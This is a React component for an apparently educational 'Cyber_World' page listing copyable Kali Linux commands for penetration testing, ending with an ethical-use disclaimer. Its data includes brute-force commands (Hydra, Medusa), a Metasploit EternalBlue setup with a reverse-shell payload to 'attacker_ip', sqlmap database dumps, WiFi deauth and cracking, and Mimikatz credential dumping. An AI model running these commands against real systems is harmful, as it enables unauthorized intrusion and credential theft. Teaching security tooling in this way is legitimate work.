import { Link } from "react-router-dom";
import { motion, type Variants } from "framer-motion";
import {
  Copy,
  Check,
  Shield,
  Wifi,
  Lock,
  Globe,
  Terminal,
  ArrowLeft,
  Info,
  Zap,
  Eye,
  AlertTriangle,
  Search,
} from "lucide-react";
import { useState } from "react";

/* ===============================
   ANIMATIONS
================================ */
const fadeUp: Variants = {
  hidden: { opacity: 0, y: 30 },
  visible: {
    opacity: 1,
    y: 0,
    transition: { duration: 0.5, ease: "easeOut" },
  },
};

const stagger: Variants = {
  hidden: {},
  visible: {
    transition: { staggerChildren: 0.08 },
  },
};

/* ===============================
   TYPES
================================ */
type ToolCommand = {
  label: string;
  cmd: string;
  description?: string;
};

type KaliTool = {
  name: string;
  description: string;
  commands: ToolCommand[];
  useCase?: string;
};

type KaliCategory = {
  category: string;
  tools: KaliTool[];
  icon: any;
};

/* ===============================
   KALI TOOLS DATA
================================ */
const kaliTools: KaliCategory[] = [
  {
    category: "Reconnaissance & Information Gathering",
    icon: Search,
    tools: [
      {
        name: "Nmap",
        description: "Network scanning and service enumeration",
        useCase: "Discover live hosts, open ports, and running services",
        commands: [
          { label: "Ping Scan", cmd: "nmap -sn 192.168.1.0/24", description: "Discover live hosts" },
          { label: "Port Scan", cmd: "nmap -p 1-65535 target", description: "Scan all ports" },
          { label: "Service Version Scan", cmd: "nmap -sV target", description: "Detect service versions" },
          { label: "OS Detection", cmd: "nmap -O target", description: "Identify operating system" },
          { label: "Aggressive Scan", cmd: "nmap -A target", description: "OS, version, script, traceroute" },
          { label: "Traceroute", cmd: "nmap --traceroute target", description: "Trace network path" },
          { label: "Vulnerability Scan", cmd: "nmap --script vuln target", description: "Check for vulnerabilities" },
        ],
      },
      {
        name: "Amass",
        description: "Attack surface and subdomain enumeration",
        useCase: "Discover subdomains and map attack surface",
        commands: [
          { label: "Passive Enum", cmd: "amass enum -passive -d example.com", description: "Passive subdomain discovery" },
          { label: "Active Enum", cmd: "amass enum -active -d example.com", description: "Active subdomain discovery" },
          { label: "ASN Lookup", cmd: "amass intel -asn 13335", description: "Find domains by ASN" },
          { label: "IP Discovery", cmd: "amass intel -ip -d example.com", description: "Discover IPs" },
          { label: "Save Output", cmd: "amass enum -d example.com -o domains.txt", description: "Export results" },
        ],
      },
      {
        name: "theHarvester",
        description: "OSINT tool for gathering emails, names, subdomains",
        useCase: "Gather public information about targets",
        commands: [
          { label: "Basic Search", cmd: "theHarvester -d example.com -b google", description: "Search via Google" },
          { label: "All Sources", cmd: "theHarvester -d example.com -b all", description: "Use all sources" },
          { label: "DNS Brute Force", cmd: "theHarvester -d example.com -c", description: "DNS enumeration" },
          { label: "Save Results", cmd: "theHarvester -d example.com -b all -f output", description: "Export to file" },
        ],
      },
      {
        name: "Recon-ng",
        description: "Web reconnaissance framework",
        useCase: "Automated OSINT and reconnaissance",
        commands: [
          { label: "Launch Framework", cmd: "recon-ng", description: "Start recon-ng" },
          { label: "List Modules", cmd: "marketplace search", description: "Search available modules" },
          { label: "Install Module", cmd: "marketplace install recon/domains-hosts/hackertarget", description: "Install module" },
          { label: "Load Module", cmd: "modules load recon/domains-hosts/hackertarget", description: "Use module" },
        ],
      },
    ],
  },
  {
    category: "Web Application Attacks",
    icon: Globe,
    tools: [
      {
        name: "SQLmap",
        description: "Automated SQL injection testing",
        useCase: "Test and exploit SQL injection vulnerabilities",
        commands: [
          { label: "Basic Scan", cmd: "sqlmap -u \"http://target?id=1\"", description: "Test for SQL injection" },
          { label: "List Databases", cmd: "sqlmap -u \"http://target?id=1\" --dbs", description: "Enumerate databases" },
          { label: "List Tables", cmd: "sqlmap -u \"http://target?id=1\" -D db --tables", description: "List tables in DB" },
          { label: "Dump DB", cmd: "sqlmap -u \"http://target?id=1\" -D db --dump", description: "Extract all data" },
          { label: "Batch Mode", cmd: "sqlmap -u \"http://target?id=1\" --batch", description: "Auto-answer prompts" },
          { label: "POST Request", cmd: "sqlmap -u \"http://target\" --data=\"id=1&name=test\"", description: "Test POST parameters" },
        ],
      },
      {
        name: "Dirsearch",
        description: "Directory and file brute forcing",
        useCase: "Discover hidden directories and files",
        commands: [
          { label: "Basic Scan", cmd: "dirsearch -u http://target", description: "Find directories" },
          { label: "With Extensions", cmd: "dirsearch -u http://target -e php,html,js", description: "Specific file types" },
          { label: "Recursive Scan", cmd: "dirsearch -u http://target -r", description: "Scan subdirectories" },
          { label: "Custom Wordlist", cmd: "dirsearch -u http://target -w wordlist.txt", description: "Use custom wordlist" },
          { label: "Save Report", cmd: "dirsearch -u http://target --plain-text-report=out.txt", description: "Export results" },
        ],
      },
      {
        name: "Burp Suite",
        description: "Web application security testing platform",
        useCase: "Intercept and modify web traffic",
        commands: [
          { label: "Launch GUI", cmd: "burpsuite", description: "Start Burp Suite" },
          { label: "CLI Mode", cmd: "burpsuite --project-file=test.burp", description: "Load project" },
        ],
      },
      {
        name: "Nikto",
        description: "Web server vulnerability scanner",
        useCase: "Scan web servers for known vulnerabilities",
        commands: [
          { label: "Basic Scan", cmd: "nikto -h http://target", description: "Scan web server" },
          { label: "HTTPS Scan", cmd: "nikto -h https://target", description: "Scan HTTPS site" },
          { label: "Specific Port", cmd: "nikto -h target -p 8080", description: "Scan custom port" },
          { label: "Save Output", cmd: "nikto -h http://target -o report.html -Format html", description: "Export HTML report" },
        ],
      },
      {
        name: "WPScan",
        description: "WordPress vulnerability scanner",
        useCase: "Audit WordPress installations",
        commands: [
          { label: "Basic Scan", cmd: "wpscan --url http://target", description: "Scan WordPress site" },
          { label: "Enumerate Users", cmd: "wpscan --url http://target --enumerate u", description: "Find usernames" },
          { label: "Enumerate Plugins", cmd: "wpscan --url http://target --enumerate p", description: "Find plugins" },
          { label: "Password Attack", cmd: "wpscan --url http://target -U users.txt -P pass.txt", description: "Brute force login" },
        ],
      },
    ],
  },
  {
    category: "Password Attacks",
    icon: Lock,
    tools: [
      {
        name: "Hydra",
        description: "Online brute-force attack tool",
        useCase: "Brute force network services",
        commands: [
          { label: "SSH Attack", cmd: "hydra -l root -P pass.txt ssh://target", description: "Brute force SSH" },
          { label: "FTP Attack", cmd: "hydra -L users.txt -P pass.txt ftp://target", description: "Brute force FTP" },
          { label: "HTTP Login", cmd: "hydra -l admin -P pass.txt http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\"", description: "Brute force web login" },
          { label: "RDP Attack", cmd: "hydra -L users.txt -P pass.txt rdp://target", description: "Brute force RDP" },
          { label: "Verbose Mode", cmd: "hydra -V -l admin -P pass.txt ssh://target", description: "Show attempts" },
          { label: "MySQL Attack", cmd: "hydra -l root -P pass.txt mysql://target", description: "Brute force MySQL" },
        ],
      },
      {
        name: "John the Ripper",
        description: "Offline password cracking",
        useCase: "Crack password hashes",
        commands: [
          { label: "Crack Hashes", cmd: "john hashes.txt", description: "Auto-detect and crack" },
          { label: "Show Results", cmd: "john --show hashes.txt", description: "Display cracked passwords" },
          { label: "Wordlist Mode", cmd: "john --wordlist=rockyou.txt hashes.txt", description: "Use wordlist" },
          { label: "Incremental Mode", cmd: "john --incremental hashes.txt", description: "Brute force mode" },
          { label: "Specify Format", cmd: "john --format=md5 hashes.txt", description: "Set hash type" },
          { label: "Use Rules", cmd: "john --wordlist=rockyou.txt --rules hashes.txt", description: "Apply mangling rules" },
        ],
      },
      {
        name: "Hashcat",
        description: "Advanced password recovery",
        useCase: "GPU-accelerated hash cracking",
        commands: [
          { label: "Dictionary Attack", cmd: "hashcat -m 0 -a 0 hashes.txt rockyou.txt", description: "Wordlist attack" },
          { label: "Combinator Attack", cmd: "hashcat -m 0 -a 1 hashes.txt dict1.txt dict2.txt", description: "Combine wordlists" },
          { label: "Mask Attack", cmd: "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a", description: "Brute force pattern" },
          { label: "Show Results", cmd: "hashcat -m 0 hashes.txt --show", description: "Display cracked" },
        ],
      },
      {
        name: "Medusa",
        description: "Parallel network brute forcer",
        useCase: "Fast parallel brute forcing",
        commands: [
          { label: "SSH Attack", cmd: "medusa -h target -u root -P pass.txt -M ssh", description: "Brute force SSH" },
          { label: "Multiple Hosts", cmd: "medusa -H hosts.txt -U users.txt -P pass.txt -M ssh", description: "Multiple targets" },
          { label: "FTP Attack", cmd: "medusa -h target -U users.txt -P pass.txt -M ftp", description: "Brute force FTP" },
        ],
      },
    ],
  },
  {
    category: "Wireless Attacks",
    icon: Wifi,
    tools: [
      {
        name: "Aircrack-ng",
        description: "Wireless security auditing",
        useCase: "Crack WEP and WPA/WPA2 passwords",
        commands: [
          { label: "Monitor Mode", cmd: "airmon-ng start wlan0", description: "Enable monitor mode" },
          { label: "Capture Packets", cmd: "airodump-ng wlan0mon", description: "Scan for networks" },
          { label: "Target Capture", cmd: "airodump-ng -c 6 --bssid BSSID -w capture wlan0mon", description: "Capture specific AP" },
          { label: "Deauth Attack", cmd: "aireplay-ng --deauth 10 -a BSSID wlan0mon", description: "Force handshake" },
          { label: "Crack WPA", cmd: "aircrack-ng -w rockyou.txt capture.cap", description: "Crack captured handshake" },
          { label: "Stop Monitor", cmd: "airmon-ng stop wlan0mon", description: "Disable monitor mode" },
        ],
      },
      {
        name: "Wifite",
        description: "Automated wireless attack tool",
        useCase: "Automated WiFi cracking",
        commands: [
          { label: "Launch Attack", cmd: "wifite", description: "Auto-detect and attack" },
          { label: "WPA Only", cmd: "wifite --wpa", description: "Target WPA networks" },
          { label: "Specific Interface", cmd: "wifite -i wlan0mon", description: "Use specific interface" },
          { label: "Custom Wordlist", cmd: "wifite --dict /path/to/wordlist.txt", description: "Use custom dictionary" },
        ],
      },
      {
        name: "Reaver",
        description: "WPS brute force tool",
        useCase: "Attack WPS-enabled routers",
        commands: [
          { label: "WPS Attack", cmd: "reaver -i wlan0mon -b BSSID -vv", description: "Attack WPS PIN" },
          { label: "Pixie Dust", cmd: "reaver -i wlan0mon -b BSSID -K", description: "Pixie dust attack" },
        ],
      },
    ],
  },
  {
    category: "Exploitation Frameworks",
    icon: Terminal,
    tools: [
      {
        name: "Metasploit",
        description: "Advanced exploitation framework",
        useCase: "Exploit known vulnerabilities",
        commands: [
          { label: "Launch Console", cmd: "msfconsole", description: "Start Metasploit" },
          { label: "Search Exploit", cmd: "search apache", description: "Find exploits" },
          { label: "Use Exploit", cmd: "use exploit/windows/smb/ms17_010_eternalblue", description: "Load exploit" },
          { label: "Set Target", cmd: "set RHOSTS target", description: "Set target IP" },
          { label: "Set Payload", cmd: "set PAYLOAD windows/meterpreter/reverse_tcp", description: "Choose payload" },
          { label: "Set LHOST", cmd: "set LHOST attacker_ip", description: "Set listener IP" },
          { label: "Show Options", cmd: "show options", description: "View settings" },
          { label: "Run Exploit", cmd: "exploit", description: "Execute exploit" },
        ],
      },
      {
        name: "SearchSploit",
        description: "Exploit database search tool",
        useCase: "Find public exploits",
        commands: [
          { label: "Search Exploit", cmd: "searchsploit apache", description: "Search for exploits" },
          { label: "Examine Exploit", cmd: "searchsploit -x exploits/linux/remote/12345.py", description: "View exploit code" },
          { label: "Copy to Directory", cmd: "searchsploit -m exploits/linux/remote/12345.py", description: "Copy exploit" },
          { label: "Update Database", cmd: "searchsploit -u", description: "Update exploit DB" },
        ],
      },
    ],
  },
  {
    category: "Post-Exploitation",
    icon: Shield,
    tools: [
      {
        name: "Mimikatz",
        description: "Windows credential extraction",
        useCase: "Extract passwords from Windows",
        commands: [
          { label: "Dump Credentials", cmd: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", description: "Extract passwords" },
          { label: "Dump SAM", cmd: "mimikatz.exe \"privilege::debug\" \"lsadump::sam\" exit", description: "Dump SAM database" },
        ],
      },
      {
        name: "LinPEAS",
        description: "Linux privilege escalation scanner",
        useCase: "Find privilege escalation vectors",
        commands: [
          { label: "Run Scanner", cmd: "./linpeas.sh", description: "Scan for privesc" },
          { label: "Save Output", cmd: "./linpeas.sh -a > report.txt", description: "Export results" },
        ],
      },
      {
        name: "WinPEAS",
        description: "Windows privilege escalation scanner",
        useCase: "Find Windows privesc vectors",
        commands: [
          { label: "Run Scanner", cmd: ".\\winPEASx64.exe", description: "Scan for privesc" },
          { label: "Quick Scan", cmd: ".\\winPEASx64.exe quiet", description: "Less verbose output" },
        ],
      },
    ],
  },
];

/* ===============================
   STICKY BACK BUTTON
================================ */
function StickyBackButton() {
  return (
    <motion.div
      initial={{ opacity: 0, x: -20 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.4 }}
      className="fixed top-24 left-7 z-50"
    >
      <Link
        to="/linux"
        className="inline-flex items-center gap-2 px-4 py-2.5 rounded-xl
                   bg-gradient-to-r from-cyan-500/10 to-blue-500/10 
                   backdrop-blur-md border border-cyan-400/30
                   hover:border-cyan-400/50 hover:from-cyan-500/20 
                   hover:to-blue-500/20 text-sm font-medium text-gray-200 
                   transition-all duration-300 shadow-lg shadow-cyan-500/10"
      >
        <ArrowLeft size={16} />
        Back to Linux
      </Link>
    </motion.div>
  );
}

/* ===============================
   COMMAND ITEM
================================ */
function CommandItem({ command }: { command: ToolCommand }) {
  const [copied, setCopied] = useState(false);
  const [showDesc, setShowDesc] = useState(false);

  const handleCopy = async () => {
    await navigator.clipboard.writeText(command.cmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  return (
    <div className="group bg-black/40 rounded-lg border border-white/10 hover:border-cyan-400/30 transition-all duration-200">
      <div className="flex justify-between items-start gap-3 p-3">
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 mb-1">
            <span className="text-cyan-400 text-sm font-medium">
              {command.label}
            </span>
            {command.description && (
              <button
                onClick={() => setShowDesc(!showDesc)}
                className="p-1 rounded hover:bg-white/10 transition-colors"
              >
                <Info
                  size={12}
                  className={`${
                    showDesc ? "text-purple-400" : "text-gray-500"
                  }`}
                />
              </button>
            )}
          </div>
          <code className="text-sm text-gray-300 font-mono break-all">
            {command.cmd}
          </code>
          {showDesc && command.description && (
            <p className="text-xs text-purple-300 mt-2 flex items-start gap-1">
              <Zap size={10} className="mt-0.5 flex-shrink-0" />
              {command.description}
            </p>
          )}
        </div>
        <button
          onClick={handleCopy}
          className="p-2 rounded-lg bg-white/5 hover:bg-cyan-500/20 
                     border border-white/10 hover:border-cyan-400/30
                     transition-all duration-200 flex-shrink-0"
          aria-label="Copy command"
        >
          {copied ? (
            <Check size={16} className="text-green-400" />
          ) : (
            <Copy size={16} className="text-gray-400" />
          )}
        </button>
      </div>
    </div>
  );
}

/* ===============================
   TOOL CARD
================================ */
function ToolCard({ tool }: { tool: KaliTool }) {
  const [expanded, setExpanded] = useState(false);

  return (
    <motion.div
      variants={fadeUp}
      className="bg-white/5 border border-white/10 rounded-2xl p-6 hover:border-cyan-400/30 transition-all duration-300"
    >
      <div className="mb-4">
        <h3 className="text-xl font-semibold text-cyan-400 mb-2">
          {tool.name}
        </h3>
        <p className="text-sm text-gray-400 mb-2">{tool.description}</p>
        {tool.useCase && (
          <div className="flex items-start gap-2 p-2 rounded-lg bg-purple-500/10 border border-purple-400/20">
            <Eye size={14} className="text-purple-400 mt-0.5 flex-shrink-0" />
            <p className="text-xs text-purple-200">{tool.useCase}</p>
          </div>
        )}
      </div>

      <div className="space-y-2">
        {(expanded ? tool.commands : tool.commands.slice(0, 3)).map((cmd, i) => (
          <CommandItem key={i} command={cmd} />
        ))}
      </div>

      {tool.commands.length > 3 && (
        <button
          onClick={() => setExpanded(!expanded)}
          className="mt-3 w-full py-2 text-sm text-cyan-400 hover:text-cyan-300 
                     bg-white/5 hover:bg-white/10 rounded-lg border border-white/10
                     hover:border-cyan-400/30 transition-all duration-200"
        >
          {expanded
            ? "Show Less"
            : `Show ${tool.commands.length - 3} More Commands`}
        </button>
      )}
    </motion.div>
  );
}

/* ===============================
   MAIN COMPONENT
================================ */
export default function Linuxtoolscmd() {
  return (
    <>
      <StickyBackButton />

      <div className="px-10 py-12 max-w-7xl mx-auto text-white">
        {/* HEADER */}
        <motion.div
          variants={fadeUp}
          initial="hidden"
          animate="visible"
          className="mb-10"
        >
          <h1 className="text-4xl font-bold bg-gradient-to-r from-cyan-400 to-blue-400 bg-clip-text text-transparent mb-3">
            🧰 Kali Linux Tools & Commands
          </h1>
          <p className="text-gray-300 text-lg leading-relaxed">
            Comprehensive guide to Kali Linux tools with real-world command
            usage examples for penetration testing and security auditing.
          </p>
        </motion.div>

        {/* INFO BANNER */}
        <motion.div
          variants={fadeUp}
          initial="hidden"
          animate="visible"
          className="flex items-start gap-3 p-4 rounded-xl bg-blue-500/10 border border-blue-400/30 mb-10"
        >
          <Info size={20} className="text-blue-400 mt-0.5 flex-shrink-0" />
          <div className="text-sm text-gray-300">
            <strong className="text-blue-300 font-semibold">Pro Tip:</strong>{" "}
            Click the info icon (<Info size={12} className="inline text-purple-400" />) 
            to see what each command does. Click "Show More" to reveal additional commands.
          </div>
        </motion.div>

        {/* TOOLS BY CATEGORY */}
        <motion.div initial="hidden" animate="visible" variants={stagger}>
          {kaliTools.map((section) => {
            const Icon = section.icon;
            return (
              <div key={section.category} className="mb-12">
                <motion.div
                  variants={fadeUp}
                  className="flex items-center gap-3 mb-6"
                >
                  <div className="p-2 rounded-lg bg-cyan-500/20">
                    <Icon size={22} className="text-cyan-400" />
                  </div>
                  <h2 className="text-2xl font-semibold text-cyan-300">
                    {section.category}
                  </h2>
                  <span className="px-2 py-1 rounded-lg bg-white/5 text-xs text-gray-400">
                    {section.tools.length} tools
                  </span>
                </motion.div>

                <motion.div
                  variants={stagger}
                  className="grid md:grid-cols-2 gap-6"
                >
                  {section.tools.map((tool) => (
                    <ToolCard key={tool.name} tool={tool} />
                  ))}
                </motion.div>
              </div>
            );
          })}
        </motion.div>

        {/* ETHICAL WARNING */}
        <motion.div
          variants={fadeUp}
          initial="hidden"
          whileInView="visible"
          viewport={{ once: true }}
          className="mt-16 p-6 rounded-2xl
                     bg-gradient-to-r from-red-950/80 to-black/80
                     border border-red-500/30
                     shadow-[0_0_30px_rgba(239,68,68,0.25)]"
        >
          <div className="flex items-start gap-3 mb-3">
            <AlertTriangle size={24} className="text-red-400 flex-shrink-0" />
            <h3 className="text-red-400 font-bold text-xl">
              Educational & Ethical Use Only
            </h3>
          </div>

          <p className="text-gray-300 text-sm leading-relaxed">
            All Kali Linux tools, commands, and examples on{" "}
            <span className="text-red-400 font-semibold">Cyber_World</span> are
            intended strictly for{" "}
            <strong className="text-red-300">
              educational and ethical purposes
            </strong>
            . We do not promote illegal hacking, unauthorized access, or misuse
            of security tools.
            <br />
            <br />
            Users are solely responsible for ensuring they have{" "}
            <strong className="text-red-300">explicit authorization</strong>{" "}
            before testing any system and must comply with all applicable laws
            and ethical guidelines. Unauthorized access to computer systems is
            illegal and punishable by law.
          </p>
        </motion.div>
      </div>
    </>
  );
}